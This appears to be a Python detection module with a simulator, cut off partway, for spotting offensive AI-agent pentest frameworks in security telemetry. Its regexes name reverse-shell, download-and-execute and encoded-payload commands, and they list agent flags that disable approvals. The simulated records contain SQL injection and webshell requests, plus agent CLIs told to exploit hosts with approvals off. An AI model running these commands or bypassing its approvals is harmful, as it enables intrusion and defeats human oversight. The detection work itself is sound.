"""Detection of offensive AI-agent frameworks (ARTEX/AntiFox, Cairn, PentAGI, HexStrike, CyberStrikeAI,
Strix, Hermes Agent, Agent Zero) from EDR / NDR / web / proxy telemetry.

Two layers:
1. Behaviour rules (OAI-001..005, 007): durable, tool-agnostic. Operators can change user agents and
   banners; they rarely change *how* an agent works (approvals off, machine-speed tool fan-out,
   rotating proxies, multi-stage chains, model-API egress).
2. Indicator match (OAI-006): the community indicator set from
   github.com/ThreatDefence/agentic-attack-detections (MIT), loaded live by app.modules.threatintel.
   A handful of high-confidence seeds from that set are bundled so the demo works offline.

Record shapes (kind):
  process: host, user, pid, ppid, image, cmdline, parent_image?, parent_cmdline?
  http   : dst_host, src_ip, method, uri, status, ua          (web server / WAF / reverse proxy log)
  net    : host, dest, dest_ip, port, bytes_out                (EDR network / NDR / DNS / proxy egress)
  logon  : dest_host, src_host, src_ip, user, event_id, logon_type   (AD / Windows security log, EDR logons)
  db     : host, user, client_host, client_ip, db, statement, rows, bytes   (database audit log)
  dlp    : host, user, dest, channel, bytes, classification, action      (DLP / CASB)
"""
import ipaddress
import itertools
import re
from collections import Counter, defaultdict, deque

from app.config import settings
from app.modules import threatintel

SOURCE = "https://github.com/ThreatDefence/agentic-attack-detections"
# id -> (name, description, behaviour focus, rules that cover that behaviour)
FRAMEWORKS = {
    "artex": ("ARTEX", "Autonomous pentest console; renamed builds exist (ScopeWeaver, ARTEX PRO)",
              "Multi-step Intrusion, Autonomous Execution", ["OAI-005", "OAI-001", "OAI-012", "OAI-009", "OAI-006"]),
    "antifox": ("AntiFox", "Fork of ARTEX with its own image, favicon and console",
                "Fork-specific Indicators และ Behavior", ["OAI-006", "OAI-005", "OAI-001"]),
    "cairn": ("CAIRN", "Fact-graph exploration; Claude Code / Codex / Pi workers in a Kali container",
              "Multi-Agent Coordination, Tool Orchestration", ["OAI-012", "OAI-001", "OAI-003", "OAI-006"]),
    "pentagi": ("PentAGI", "Autonomous pentest platform (vxcontrol); customized builds seen in Asia",
                "Reconnaissance, Pentest Tool Chains", ["OAI-003", "OAI-005", "OAI-008", "OAI-006"]),
    "hexstrike": ("HexStrike AI", "MCP tool server exposing ~150 security tools, API on 8888",
                  "MCP-mediated Security Tool Invocation", ["OAI-013", "AGT-012", "OAI-003", "OAI-006"]),
    "cyberstrikeai": ("CyberStrikeAI", "Go console with ~90 tools, implant builder, C2 and webshell manager",
                      "Orchestrated Tool Execution", ["OAI-003", "OAI-005", "OAI-007", "OAI-006"]),
    "strix": ("Strix", "Python AI pentest agents in a Kali sandbox behind a Caido proxy",
              "Web/API Security Testing Patterns", ["OAI-008", "OAI-004", "OAI-007", "OAI-006"]),
    "hermes": ("Hermes Agent", "General agent abused with approvals off (--yolo) and a jailbreak skill",
               "Shell Execution, External Tool Access", ["OAI-014", "OAI-001", "AGT-003", "OAI-002", "OAI-006"]),
    "agent-zero": ("Agent Zero", "General agent in a Kali container with a built-in hacker profile",
                   "Dynamic Code Execution, Agent Workflows", ["OAI-014", "AGT-003", "OAI-006"]),
}
# Verbatim high-confidence seeds from the ThreatDefence indicators.csv (offline fallback only).
SEED = [
    ("user_agent", "HexStrike-HTTP-Framework/1.0", "high", "hexstrike"),
    ("user_agent", "HexStrike-BrowserAgent/1.0", "high", "hexstrike"),
    ("user_agent", "CyberStrikeAI-WebShell/1.0", "high", "cyberstrikeai"),
    ("string", ":OSPROBE_", "high", "cyberstrikeai"),
    ("user_agent", "artex-pentest/1.0", "high", "artex"),
    ("user_agent", "ARTEX-worker/1.0", "high", "artex"),
    ("string", "hexstrikeXSSTest123", "high", "hexstrike"),
    ("file_name", "hexstrike_server.py", "high", "hexstrike"),
    ("docker_image", "ghcr.io/usestrix/strix-sandbox", "high", "strix"),
    ("string", "HERMES_YOLO_MODE", "high", "hermes"),
    ("docker_image", "vxcontrol/kali-linux", "high", "pentagi"),
    ("docker_image", "ghcr.io/oritera/cairn-worker-container", "high", "cairn"),
    ("docker_image", "agent0ai/agent-zero", "medium", "agent-zero"),
]

# Model-API hostnames. region "CN" = provider based in mainland China. Verify before blocking.
LLM_APIS = {
    "api.openai.com": ("OpenAI", "US"), "api.anthropic.com": ("Anthropic", "US"),
    "generativelanguage.googleapis.com": ("Google Gemini", "US"), "api.x.ai": ("xAI", "US"),
    "api.mistral.ai": ("Mistral", "EU"), "api.groq.com": ("Groq", "US"), "openrouter.ai": ("OpenRouter", "US"),
    "api.together.xyz": ("Together", "US"),
    "api.deepseek.com": ("DeepSeek", "CN"), "dashscope.aliyuncs.com": ("Alibaba Qwen (DashScope)", "CN"),
    "dashscope-intl.aliyuncs.com": ("Alibaba Qwen (DashScope intl)", "CN"),
    "open.bigmodel.cn": ("Zhipu GLM", "CN"), "api.moonshot.cn": ("Moonshot Kimi", "CN"),
    "api.minimax.chat": ("MiniMax", "CN"), "api.minimaxi.com": ("MiniMax", "CN"),
    "ark.cn-beijing.volces.com": ("ByteDance Doubao (Volcengine Ark)", "CN"),
    "api.siliconflow.cn": ("SiliconFlow", "CN"), "qianfan.baidubce.com": ("Baidu Qianfan", "CN"),
}
AGENT_CLIS = {"claude", "codex", "gemini", "qwen", "kimi", "opencode", "hermes", "pi", "aider", "cursor-agent"}
APPROVAL_BYPASS = re.compile(
    r"(--dangerously-skip-permissions|--dangerously-bypass-approvals-and-sandbox|--full-auto|--yolo\b|"
    r"--approval-mode[ =]yolo|--permission-mode[ =]bypassPermissions|--auto-approve|--yes-always|"
    r"HERMES_YOLO_MODE|approvals\.mode:\s*off)", re.I)
RECON_TOOLS = {"nmap", "masscan", "naabu", "subfinder", "amass", "httpx", "katana", "whatweb", "dnsx"}
SCAN_TOOLS = {"nuclei", "ffuf", "gobuster", "feroxbuster", "dirsearch", "sqlmap", "nikto", "wpscan", "dalfox"}
EXPLOIT_TOOLS = {"msfconsole", "hydra", "medusa", "searchsploit", "interactsh-client"}
POST_TOOLS = {"netexec", "nxc", "crackmapexec", "impacket-secretsdump", "impacket-psexec", "secretsdump.py",
              "psexec.py", "kerbrute", "responder", "mimikatz", "rubeus", "evil-winrm", "chisel", "ligolo"}
OFFENSIVE = RECON_TOOLS | SCAN_TOOLS | EXPLOIT_TOOLS | POST_TOOLS
OAST = ("oast.fun", "oast.pro", "oast.live", "oast.site", "oast.online", "oast.me", "interact.sh",
        "burpcollaborator.net", "oastify.com", "dnslog.cn", "webhook.site", "requestrepo.com")
PROBE_URI = re.compile(r"(/\.env\b|/\.git/|/wp-config|/etc/passwd|\.\./|'\s*or\s*'|union\s+select|/actuator|/server-status)", re.I)

RULES = {
    "OAI-001": ("AI agent CLI with approvals disabled launched attack tooling", "high", "T1059", "Execution"),
    "OAI-002": ("Server called external AI model API", "medium", "T1071.001", "Command and Control"),
    "OAI-003": ("Rapid offensive-tool fan-out from one source", "high", "T1595", "Reconnaissance"),
    "OAI-004": ("Recon through rotating proxies (many IPs, one target)", "medium", "T1090.002", "Reconnaissance"),
    "OAI-005": ("Autonomous multi-stage chain (recon→scan→exploit→post)", "critical", "T1190", "Initial Access"),
    "OAI-006": ("Known offensive-AI framework indicator", "high", "T1588.002", "Resource Development"),
    "OAI-007": ("Out-of-band (OAST) callback", "medium", "T1071.004", "Command and Control"),
    "OAI-008": ("Web/API reconnaissance burst from one source", "medium", "T1595.003", "Reconnaissance"),
    "OAI-009": ("Lateral movement fan-out (one source, many hosts)", "high", "T1021", "Lateral Movement"),
    "OAI-010": ("Suspicious database access (dump / bulk read)", "high", "T1213", "Collection"),
    "OAI-011": ("Data exfiltration after bulk access", "critical", "T1567", "Exfiltration"),
    "OAI-012": ("Multiple AI agents with approvals off on one host (agent swarm)", "high", "T1059", "Execution"),
    "OAI-013": ("Security tools launched by an MCP server", "high", "T1059", "Execution"),
    "OAI-014": ("AI agent ran download-and-execute / encoded / dynamic code", "high", "T1059", "Execution"),
}
SWARM_WINDOW = 600
MCP_SERVER_RE = re.compile(r"(hexstrike_(server|mcp)\.py|mcp[-_]server|fastmcp|\bmcp\s+(run|serve)\b|cyberstrike-ai)", re.I)
AGENT_RUNTIME_RE = re.compile(r"(agent[-_ ]?zero|run_ui\.py|\bhermes\b|cairn|pentagi|strix|openhands|autogpt)", re.I)
DYNAMIC_CODE = [
    ("download-and-execute", re.compile(r"(curl|wget|iwr|invoke-webrequest)\b[^|;&]*\|\s*(sudo\s+)?((ba|z|da)?sh|python3?|perl|ruby|node|iex)\b", re.I)),
    ("reverse shell", re.compile(r"(/dev/tcp/|\bnc(at)?\b[^|;]*\s-e\s|bash\s+-i\s*>&|socat\b.+exec:)", re.I)),
    ("encoded payload", re.compile(r"(base64\s+(-d|--decode)\s*\||-enc(odedcommand)?\s+[A-Za-z0-9+/=]{20,}|frombase64string)", re.I)),
    ("inline code", re.compile(r"((python3?|perl|ruby)\s+-[ce]\s+.{0,400}(exec|eval|base64|socket|urllib|subprocess|os\.system)|"
                               r"node\s+-e\s+.{0,400}(child_process|eval|require\(.http))", re.I)),
]
# thresholds (tune per environment)
BURST_REQ, BURST_PATHS, BURST_WINDOW = 60, 40, 60          # OAI-008: per source IP and target
LATERAL_HOSTS, LATERAL_WINDOW = 10, 600                      # OAI-009
ADMIN_PORTS = {22, 135, 139, 445, 3389, 5985, 5986}
DB_BULK_ROWS, DB_BULK_BYTES, DB_WINDOW = 100_000, 50_000_000, 600   # OAI-010
EXFIL_BYTES, EXFIL_WINDOW = 50_000_000, 1800                 # OAI-011
DB_DUMP = re.compile(r"(mysqldump|pg_dump|pg_dumpall|mongodump|\binto\s+outfile\b|\bcopy\b.+\bto\b|backup\s+database|"
                     r"\bbcp\b.+\bout\b|xp_cmdshell|exp\s+\w+/|expdp\b)", re.I | re.S)
SENSITIVE_CLASSES = {"confidential", "restricted", "secret", "pii", "personal", "pci", "phi", "sensitive"}


def is_internal_ip(v: str | None) -> bool:
    try:
        return ipaddress.ip_address(v or "").is_private
    except ValueError:
        return False
STAGES = ["recon", "scan", "exploit", "post"]
SERVER_PREFIXES = tuple(p.upper() for p in settings.server_prefixes) or ("SRV",)
FANOUT_TOOLS, FANOUT_WINDOW = 4, 120
PROXY_IPS, PROXY_WINDOW = 20, 300
CHAIN_STAGES, CHAIN_WINDOW = 3, 900


def tool_name(image: str) -> str:
    base = re.split(r"[\\/]", image or "")[-1].lower()
    return base[:-4] if base.endswith(".exe") else base


def llm_api(dest: str):
    dest = (dest or "").lower().rstrip(".")
    for host, meta in LLM_APIS.items():
        if dest == host or dest.endswith("." + host):
            return host, meta
    return None


class IndicatorIndex:
    """Matches telemetry fields against the agentic indicator set with false-positive guards."""

    def __init__(self, rows: list[dict] | None = None):
        rows = rows or [{"type": t, "value": v, "confidence": c, "framework": f, "source_url": SOURCE}
                        for t, v, c, f in SEED]
        self.rows = rows
        self.by_type: dict[str, list[dict]] = defaultdict(list)
        for r in rows:
            v = (r.get("value") or "").strip()
            if r.get("confidence") == "low" or len(v) < 6:
                continue  # low-confidence rows are legitimate services / generic values: hunt, don't alert
            if "applewebkit" in v.lower() and r["type"] in ("user_agent", "string"):
                continue  # generic browser strings would match every visitor
            self.by_type[r["type"]].append({**r, "_v": v.lower()})

    def match(self, rec: dict) -> list[dict]:
        hay = {
            "ua": (rec.get("ua") or "").lower(),
            "text": " ".join(str(rec.get(k) or "") for k in ("cmdline", "image", "uri", "container")).lower(),
            "addr": {(rec.get(k) or "").lower() for k in ("src_ip", "dest", "dest_ip") if rec.get(k)},
        }
        hits = []
        for r in self.by_type.get("user_agent", []):
            if r["_v"] in hay["ua"]:
                hits.append(r)
        for t in ("string", "uri_string", "file_name", "file_path", "docker_image"):
            for r in self.by_type.get(t, []):
                if r["_v"] in hay["text"] or (t in ("string", "uri_string") and r["_v"] in hay["ua"]):
                    hits.append(r)
        for t in ("ipv4", "domain"):
            for r in self.by_type.get(t, []):
                if r["_v"] in hay["addr"]:
                    hits.append(r)
        return hits


class Detector:
    def __init__(self, approved_ai_hosts: set[str] | None = None):
        self.approved = approved_ai_hosts or set()
        self.procs: dict[tuple, dict] = {}  # (host, pid) -> process
        self.fanout: dict[str, deque] = defaultdict(deque)  # source -> (ts, tool)
        self.inbound: dict[str, deque] = defaultdict(deque)  # target -> (ts, src_ip, status)
        # running per-target counts over the same window, so OAI-004 is O(1) per request instead of O(window)
        self.inbound_n: dict[str, Counter] = defaultdict(Counter)    # target -> requests per source IP
        self.inbound_err: dict[str, Counter] = defaultdict(Counter)  # target -> 4xx/5xx per source IP
        self.probers: dict[str, set] = defaultdict(set)              # target -> source IPs that look like probes
        self.stages: dict[str, dict] = defaultdict(dict)  # entity -> stage -> ts
        self.fired: dict[tuple, float] = {}
        self.index = IndicatorIndex()
        self.burst: dict[tuple, deque] = defaultdict(deque)      # (target, src_ip) -> (ts, status, path)
        self.lateral: dict[str, deque] = defaultdict(deque)      # source -> (ts, dest)
        self.db_reads: dict[str, deque] = defaultdict(deque)     # user -> (ts, rows, bytes)
        self.bulk_access: dict[str, float] = {}                  # user/host -> ts of last OAI-010
        self.agent_runs: dict[str, deque] = defaultdict(deque)   # host -> (ts, agent cli) in approvals-off mode

    def _once(self, key: tuple, now: float, every: float = 600) -> bool:
        last = self.fired.get(key)
        if last is not None and now - last < every:
            return False
        self.fired[key] = now
        return True

    def _ancestor(self, host: str, pid, rec: dict, pred) -> dict | None:
        """First ancestor (parent fields on the record, then the process table) where pred(image, cmdline)."""
        if rec.get("parent_cmdline") and pred(rec.get("parent_image", ""), rec["parent_cmdline"]):
            return {"pid": pid, "cmdline": rec["parent_cmdline"]}
        for _ in range(6):
            p = self.procs.get((host, pid))
            if p is None:
                return None
            if pred(p.get("image", ""), p.get("cmdline", "")):
                return p
            pid = p.get("ppid")
        return None

    def _ancestor_bypass(self, host: str, pid, rec: dict | None = None) -> dict | None:
        # EDR rows (Defender, ECS) carry the parent's command line, so check it before walking the tree
        if rec and rec.get("parent_cmdline") and tool_name(rec.get("parent_image", "")) in AGENT_CLIS \
                and APPROVAL_BYPASS.search(rec["parent_cmdline"]):
            return {"pid": pid, "cmdline": rec["parent_cmdline"]}
        seen = 0
        while pid is not None and seen < 6:
            p = self.procs.get((host, pid))
            if p is None:
                return None
            if tool_name(p["image"]) in AGENT_CLIS and APPROVAL_BYPASS.search(p.get("cmdline", "")):
                return p
            pid, seen = p.get("ppid"), seen + 1
        return None

    def _fanout(self, src: str | None, dest: str | None, now: float, how: str) -> list[tuple[str, dict]]:
        if not src or not dest or src == dest:
            return []
        q = self.lateral[src]
        q.append((now, dest))
        while q and now - q[0][0] > LATERAL_WINDOW:
            q.popleft()
        dests = {d for _, d in q}
        if len(dests) >= LATERAL_HOSTS and self._once(("OAI-009", src), now):
            return [("OAI-009", {"source": src, "distinct_hosts": len(dests), "via": how,
                                 "sample_hosts": sorted(dests)[:8]})]
        return []

    def _exfil(self, rec: dict, keys: list, now: float) -> list[tuple[str, dict]]:
        prior = [k for k in keys if k and now - self.bulk_access.get(k, -1e18) <= EXFIL_WINDOW]
        sensitive = (rec.get("classification") or "").lower() in SENSITIVE_CLASSES
        if not prior and not sensitive:
            return []
        key = ("OAI-011", rec.get("user") or rec.get("host"), rec.get("dest"))
        if not self._once(key, now):
            return []
        return [("OAI-011", {"dest": rec.get("dest") or rec.get("dest_ip"), "bytes": rec.get("bytes") or rec.get("bytes_out"),
                             "after_bulk_access": bool(prior), "classification": rec.get("classification"),
                             "severity": "critical" if prior else "high"})]

    def _identity_data(self, rec: dict, now: float) -> list[tuple[str, dict]]:
        k = rec["kind"]
        if k == "logon":
            ok = rec.get("event_id") in (4624, 4625, 4648, None) and rec.get("logon_type") in (3, 10, None)
            src = rec.get("src_host") or rec.get("src_ip")
            if ok and src:  # fan-out by source machine, and by account (one credential, many hosts)
                return self._fanout(src, rec.get("dest_host"), now, "logon") + \
                    (self._fanout(f"user:{rec['user']}", rec.get("dest_host"), now, "logon") if rec.get("user") else [])
            return []
        if k == "db":
            out = []
            stmt = rec.get("statement") or ""
            who = rec.get("user") or rec.get("client_host") or "unknown"
            if DB_DUMP.search(stmt) and self._once(("OAI-010", "dump", who, rec.get("host")), now):
                out.append(("OAI-010", {"reason": "dump/export command", "statement": stmt[:160], "db_user": who}))
            q = self.db_reads[who]
            q.append((now, int(rec.get("rows") or 0), int(rec.get("bytes") or 0)))
            while q and now - q[0][0] > DB_WINDOW:
                q.popleft()
            rows, nbytes = sum(r for _, r, _ in q), sum(b for _, _, b in q)
            if (rows >= DB_BULK_ROWS or nbytes >= DB_BULK_BYTES) and self._once(("OAI-010", "bulk", who), now):
                out.append(("OAI-010", {"reason": "bulk read", "rows": rows, "bytes": nbytes, "db_user": who}))
            if out:
                for key in (rec.get("user"), rec.get("client_host"), rec.get("client_ip")):
                    if key:
                        self.bulk_access[key] = now
            return out
        # dlp
        if rec.get("dest") and not is_internal_ip(rec.get("dest")) and (rec.get("action") or "allowed").lower() != "blocked":
            return self._exfil(rec, [rec.get("user"), rec.get("host")], now)
        return []

    def _stage(self, rec: dict) -> str | None:
        k = rec["kind"]
        if k == "process":
            t = tool_name(rec.get("image", ""))
            for stage, tools in (("recon", RECON_TOOLS), ("scan", SCAN_TOOLS), ("exploit", EXPLOIT_TOOLS),
                                 ("post", POST_TOOLS)):
                if t in tools:
                    return stage
            if ":OSPROBE_" in rec.get("cmdline", "") or "whoami" in rec.get("cmdline", ""):
                return "post"
        elif k == "http":
            uri = rec.get("uri", "")
            if ":OSPROBE_" in uri or re.search(r"\.(jsp|php|aspx)\?(cmd|c|pass)=", uri, re.I):
                return "post"
            if rec.get("method") == "POST" and re.search(r"upload|\.jsp|\.php", uri, re.I) and rec.get("status") == 200:
                return "exploit"
            if PROBE_URI.search(uri):
                return "scan"
            if rec.get("status") == 404:
                return "recon"
        elif k == "net":
            d = (rec.get("dest") or "").lower()
            if any(d == o or d.endswith("." + o) for o in OAST):
                return "exploit"
            if 28000 <= int(rec.get("port") or 0) <= 29999:
                return "post"
        return None

    def evaluate(self, rec: dict, now: float) -> list[tuple[str, dict]]:
        out: list[tuple[str, dict]] = []
        k = rec["kind"]
        entity = rec.get("dst_host") if k == "http" else rec.get("dest_host") if k == "logon" else rec.get("host")
        if k == "process":
            if rec.get("pid") is not None:  # some EDR exports omit pids; still evaluate the record
                self.procs[(rec["host"], rec["pid"])] = rec
            t = tool_name(rec.get("image", ""))
            if t in OFFENSIVE:
                parent = self._ancestor_bypass(rec["host"], rec.get("ppid"), rec)
                if parent and self._once(("OAI-001", rec["host"], parent["pid"]), now):
                    out.append(("OAI-001", {"agent_cmdline": parent["cmdline"][:200]}))
                src = f'{rec["host"]}:{rec.get("ppid")}'
                q = self.fanout[src]
                q.append((now, t))
                while q and now - q[0][0] > FANOUT_WINDOW:
                    q.popleft()
                tools = {x for _, x in q}
                if len(tools) >= FANOUT_TOOLS and self._once(("OAI-003", src), now):
                    out.append(("OAI-003", {"tools": sorted(tools)}))
                mcp = self._ancestor(rec["host"], rec.get("ppid"), rec, lambda i, c: bool(MCP_SERVER_RE.search(c or "")))
                if mcp and self._once(("OAI-013", rec["host"], mcp["pid"]), now):
                    hs = "hexstrike" in mcp["cmdline"].lower()
                    out.append(("OAI-013", {"mcp_server_cmdline": mcp["cmdline"][:200], "tool": t,
                                            **({"framework": "hexstrike", "severity": "critical"} if hs else {})}))
            cmd = rec.get("cmdline") or ""
            if t in AGENT_CLIS and APPROVAL_BYPASS.search(cmd):  # OAI-012: several agents driven together
                q = self.agent_runs[rec["host"]]
                q.append((now, t))
                while q and now - q[0][0] > SWARM_WINDOW:
                    q.popleft()
                clis = {x for _, x in q}
                if (len(clis) >= 2 or len(q) >= 3) and self._once(("OAI-012", rec["host"]), now):
                    out.append(("OAI-012", {"agents": sorted(clis), "instances": len(q)}))
            for why, rx in DYNAMIC_CODE:  # OAI-014: agent runtime running risky code
                if rx.search(cmd):
                    ag = self._ancestor(rec["host"], rec.get("ppid"), rec,
                                        lambda i, c: tool_name(i) in AGENT_CLIS or bool(AGENT_RUNTIME_RE.search(c or "")))
                    if ag and self._once(("OAI-014", rec["host"], ag["pid"], why), now):
                        out.append(("OAI-014", {"pattern": why, "agent_cmdline": ag["cmdline"][:200],
                                                "severity": "critical" if why == "reverse shell" else None}))
                    break
        elif k == "net":
            hit = llm_api(rec.get("dest"))
            host = rec.get("host", "")
            approved = (host, hit[0]) in self.approved or (host, "*") in self.approved if hit else False
            if hit and host.upper().startswith(SERVER_PREFIXES) and not approved \
                    and self._once(("OAI-002", host, hit[0]), now, 1800):
                provider, region = hit[1]
                out.append(("OAI-002", {"provider": provider, "region": region, "dest": hit[0],
                                        "severity": "high" if region == "CN" else None}))
            d = (rec.get("dest") or "").lower()
            if any(d == o or d.endswith("." + o) for o in OAST) and self._once(("OAI-007", host, d), now):
                out.append(("OAI-007", {"dest": d}))
        elif k in ("logon", "db", "dlp"):
            out += self._identity_data(rec, now)
        if k == "net" and is_internal_ip(rec.get("dest_ip")) and int(rec.get("port") or 0) in ADMIN_PORTS:
            out += self._fanout(rec.get("host"), rec["dest_ip"], now, f"port {rec.get('port')}")
        if k == "net" and int(rec.get("bytes_out") or 0) >= EXFIL_BYTES and not is_internal_ip(rec.get("dest_ip")):
            out += self._exfil(rec, [rec.get("host"), rec.get("user")], now)
        if k == "http":
            b = self.burst[(entity, rec.get("src_ip"))]
            b.append((now, rec.get("status"), (rec.get("uri") or "").split("?")[0]))
            while b and now - b[0][0] > BURST_WINDOW:
                b.popleft()
            errors = sum(1 for _, st, _ in b if st and st >= 400)
            paths = len({u for _, _, u in b})
            if len(b) >= BURST_REQ and (errors / len(b) >= 0.5 or paths >= BURST_PATHS) \
                    and self._once(("OAI-008", entity, rec.get("src_ip")), now):
                out.append(("OAI-008", {"src_ip": rec.get("src_ip"), "requests": len(b), "distinct_paths": paths,
                                        "error_ratio": round(errors / len(b), 2)}))
            # count "probe-like" sources: few requests each, mostly errors. Normal visitors (mostly 2xx)
            # and single heavy scanners (many requests from one IP) are excluded.
            q, n_ip, e_ip, pset = self.inbound[entity], self.inbound_n[entity], self.inbound_err[entity], self.probers[entity]

            def touch(ip):
                n = n_ip.get(ip, 0)
                if n and n <= 5 and e_ip.get(ip, 0) / n >= 0.6:
                    pset.add(ip)
                else:
                    pset.discard(ip)
            ip, st = rec.get("src_ip"), rec.get("status")
            q.append((now, ip, st))
            n_ip[ip] += 1
            if st and st >= 400:
                e_ip[ip] += 1
            touch(ip)
            while q and now - q[0][0] > PROXY_WINDOW:
                _, old_ip, old_st = q.popleft()
                n_ip[old_ip] -= 1
                if old_st and old_st >= 400:
                    e_ip[old_ip] -= 1
                if n_ip[old_ip] <= 0:
                    n_ip.pop(old_ip, None)
                    e_ip.pop(old_ip, None)
                touch(old_ip)
            probers = pset
            if len(probers) >= PROXY_IPS and self._once(("OAI-004", entity), now):
                out.append(("OAI-004", {"distinct_ips": len(probers),
                                        "requests": sum(n_ip[ip] for ip in probers)}))
        for ind in self.index.match(rec):
            fw = ind.get("framework", "")
            if "antifox" in (ind["_v"] + " " + (ind.get("context") or "")).lower() and "antifox" not in fw:
                fw = f"{fw} antifox".strip()
            if self._once(("OAI-006", entity, ind["_v"]), now):
                out.append(("OAI-006", {"framework": fw, "indicator": ind["value"][:120], "ioc_type": ind["type"],
                                        "confidence": ind.get("confidence"), "source_url": ind.get("source_url"),
                                        "severity": "high" if ind.get("confidence") == "high" else "medium"}))
        stage = self._stage(rec)
        if stage and entity:
            st = self.stages[entity]
            st[stage] = now
            for s in list(st):
                if now - st[s] > CHAIN_WINDOW:
                    del st[s]
            if len(st) >= CHAIN_STAGES and ({"exploit", "post"} & set(st)) and self._once(("OAI-005", entity), now, 1800):
                out.append(("OAI-005", {"stages": [s for s in STAGES if s in st]}))
        return out


class OffensiveAISim:
    """Simulated telemetry: external agentic campaign via rotating proxies, an agent CLI in yolo mode
    fanning out attack tools on a workstation, and servers calling model APIs."""

    def __init__(self, rng):
        self.rng = rng
        self.pids = itertools.count(20000)
        self.camp: dict | None = None
        self.yolo: dict | None = None
        self.next_camp = 30.0
        self.next_yolo = 60.0

    def _ip(self):
        return f"{self.rng.choice(['198.51.100', '203.0.113', '192.0.2'])}.{self.rng.randint(2, 254)}"

    def _ua(self, fw: str) -> str:
        idx = threatintel.agentic_index()
        uas = [r["value"] for r in idx if r.get("framework", "").split()[0] == fw and r["type"] == "user_agent"
               and r.get("confidence") == "high"] if idx else []
        uas = uas or [v for t, v, c, f in SEED if f == fw and t == "user_agent"]
        return self.rng.choice(uas)

    def step(self, now: float) -> list[dict]:
        r: list[dict] = []
        for _ in range(self.rng.randint(0, 2)):  # benign web traffic
            r.append({"kind": "http", "dst_host": "SRV-WEB-01", "src_ip": f"10.1.{self.rng.randint(0, 9)}.{self.rng.randint(2, 200)}",
                      "method": "GET", "uri": self.rng.choice(["/", "/login", "/api/v1/status", "/assets/app.js"]),
                      "status": 200, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0"})
        if self.rng.random() < 0.05:  # approved AI servers / unapproved servers calling model APIs
            host, dest = self.rng.choice([("SRV-AI-01", "api.anthropic.com"), ("SRV-AI-02", "api.openai.com"),
                                          ("SRV-FILE-02", "api.deepseek.com"), ("SRV-SQL-01", "dashscope.aliyuncs.com"),
                                          ("SRV-WEB-01", "open.bigmodel.cn"), ("SRV-DC-01", "openrouter.ai")])
            r.append({"kind": "net", "host": host, "dest": dest, "dest_ip": self._ip(), "port": 443})
        if self.rng.random() < 0.02:  # helpdesk runs one nmap: should stay quiet
            r.append({"kind": "process", "host": "IT-WS-003", "user": "it.helpdesk", "pid": next(self.pids), "ppid": 1,
                      "image": "nmap.exe", "cmdline": "nmap -sn 10.0.3.0/24"})
        r += self._campaign(now) + self._yolo(now) + self._use_cases(now)
        for x in r:
            x.update(ts=now, simulated=True)
        return r

    def _campaign(self, now):
        if self.camp is None:
            if now < self.next_camp or self.rng.random() > 0.05:
                return []
            self.camp = {"fw": self.rng.choice(["hexstrike", "cyberstrikeai", "artex"]), "stage": 0}
        c, out = self.camp, []
        if self.rng.random() > 0.55:
            return []
        tgt = "SRV-WEB-01"
        if c["stage"] in (0, 1):  # recon through rotating proxies: many IPs, few requests each, mostly 404
            for _ in range(self.rng.randint(14, 22)):
                out.append({"kind": "http", "dst_host": tgt, "src_ip": self._ip(), "method": "GET",
                            "uri": self.rng.choice(["/admin", "/backup.zip", "/old/", "/api/v2/", "/test.php"]),
                            "status": 404, "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/129.0"})
        elif c["stage"] == 2:
            for uri in ("/.env", "/.git/config", "/api/v1/users?id=1' OR '1'='1"):
                out.append({"kind": "http", "dst_host": tgt, "src_ip": self._ip(), "method": "GET", "uri": uri,
                            "status": 403, "ua": self._ua(c["fw"])})
        elif c["stage"] == 3:
            out.append({"kind": "http", "dst_host": tgt, "src_ip": self._ip(), "method": "POST",
                        "uri": "/upload/avatar.php", "status": 200, "ua": self._ua(c["fw"])})
            out.append({"kind": "net", "host": tgt, "dest": f"{self.rng.randint(10**7, 10**8)}x.oast.fun",
                        "dest_ip": self._ip(), "port": 53})
        else:
            out.append({"kind": "http", "dst_host": tgt, "src_ip": self._ip(), "method": "GET",
                        "uri": "/upload/f1219a.jsp?cmd=echo%20:OSPROBE_%OS%:END", "status": 200,
                        "ua": "Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0)" if c["fw"] == "cyberstrikeai"
                        else self._ua(c["fw"])})
            out.append({"kind": "process", "host": tgt, "user": "svc.web", "pid": next(self.pids), "ppid": 900,
                        "image": "/bin/sh", "cmdline": "sh -c whoami; id; uname -a"})
            self.camp, self.next_camp = None, now + 120
        if self.camp:
            c["stage"] += 1
        for x in out:
            x["framework_sim"] = c["fw"]
        return out

    def _use_cases(self, now):
        """Occasional one-shot scenarios for OAI-008 (recon burst), OAI-009 (lateral fan-out), OAI-010/011 (DB exfil)."""
        x = self.rng.random()
        if x < 0.006:
            ip = self._ip()
            return [{"kind": "http", "dst_host": "SRV-WEB-01", "src_ip": ip, "method": "GET", "status": 404,
                     "uri": f"/api/v{self.rng.randint(1, 3)}/{w}", "ua": "Mozilla/5.0 (X11; Linux x86_64) Chrome/129.0"}
                    for w in self.rng.sample(["admin", "users", "debug", "config", "export", "graphql", "swagger.json",
                                              "internal", "metrics", "health", "token", "keys", "backup", "v2", "test",
                                              "old", "dev", "staging", "upload", "files"] * 4, 70)]
        if x < 0.012:
            src = self.rng.choice(["FIN-WS-022", "HR-LT-007", "DEV-WS-118"])
            return [{"kind": "logon", "dest_host": h, "src_host": src, "user": "it.helpdesk", "event_id": 4624,
                     "logon_type": 3} for h in ["SRV-DC-01", "SRV-FILE-02", "SRV-SQL-01", "SRV-WEB-01", "SRV-AI-01",
                                               "SRV-AI-02", "FIN-WS-014", "EXEC-LT-001", "SALES-LT-031", "IT-WS-003",
                                               "DEV-WS-102"]]
        if x < 0.019:  # CAIRN-style swarm: several agent CLIs with approvals off on one box
            pid = next(self.pids)
            return [{"kind": "process", "host": "SRV-AI-02", "user": "svc.ai.devops", "pid": pid + i, "ppid": 1,
                     "image": cli, "cmdline": cmd} for i, (cli, cmd) in enumerate([
                         ("claude", "claude --dangerously-skip-permissions -p 'worker 1: map 10.0.6.0/24'"),
                         ("codex", "codex exec --dangerously-bypass-approvals-and-sandbox 'worker 2: exploit web'"),
                         ("pi", "pi --provider cairn --yolo 'worker 3: report'")])]
        if x < 0.022:  # HexStrike: tools launched by the MCP tool server
            pid = next(self.pids)
            return [{"kind": "process", "host": "DEV-WS-102", "user": "dev.backend", "pid": pid, "ppid": 1,
                     "image": "python3", "cmdline": "python3 hexstrike_server.py --port 8888"},
